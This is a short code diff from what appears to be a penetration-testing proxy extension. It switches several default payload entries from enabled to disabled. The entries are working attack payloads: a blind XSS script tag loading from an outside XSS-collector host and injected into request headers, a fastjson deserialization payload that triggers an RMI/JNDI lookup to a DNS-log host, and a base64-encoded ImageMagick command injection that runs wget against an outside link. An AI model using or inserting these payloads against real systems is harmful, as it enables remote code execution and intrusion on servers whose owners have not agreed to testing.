@@ -93,12 +93,12 @@ public class ConfigTableModel extends AbstractTableModel{
 
 		defaultConfigEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Action_Add_Or_Replace_Header,false,true));
 		//避免IP:port的切分操作，把Payload破坏，所以使用不带分号的简洁Payload
-		defaultConfigEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src={dnslogserver}/{host}>",ConfigEntry.Action_Append_To_header_value,true,true));
+		defaultConfigEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src={dnslogserver}/{host}>",ConfigEntry.Action_Append_To_header_value,false,true));
 		//defaultConfigEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
 
-		defaultConfigEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://{host}.fastjson.{dnslogserver}/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,true));
+		defaultConfigEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://{host}.fastjson.{dnslogserver}/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,false));
 
-		defaultConfigEntries.add(new ConfigEntry("Imagemagick","cHVzaCBncmFwaGljLWNvbnRleHQNCnZpZXdib3ggMCAwIDY0MCA0ODANCmltYWdlIG92ZXIgMCwwIDAsMCAnaHR0cHM6Ly9pbWFnZW1hZ2ljLmJpdC4weTAubGluay94LnBocD94PWB3Z2V0IC1PLSAlcyA+IC9kZXYvbnVsbGAnDQpwb3AgZ3JhcGhpYy1jb250ZXh0",ConfigEntry.Config_Custom_Payload_Base64,true));
+		defaultConfigEntries.add(new ConfigEntry("Imagemagick","cHVzaCBncmFwaGljLWNvbnRleHQNCnZpZXdib3ggMCAwIDY0MCA0ODANCmltYWdlIG92ZXIgMCwwIDAsMCAnaHR0cHM6Ly9pbWFnZW1hZ2ljLmJpdC4weTAubGluay94LnBocD94PWB3Z2V0IC1PLSAlcyA+IC9kZXYvbnVsbGAnDQpwb3AgZ3JhcGhpYy1jb250ZXh0",ConfigEntry.Config_Custom_Payload_Base64,false));
 
 		defaultConfigEntries.add(new ConfigEntry("*.firefox.com", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
 		defaultConfigEntries.add(new ConfigEntry("*.mozilla.com", "",ConfigEntry.Action_Drop_Request_If_Host_Matches,true));
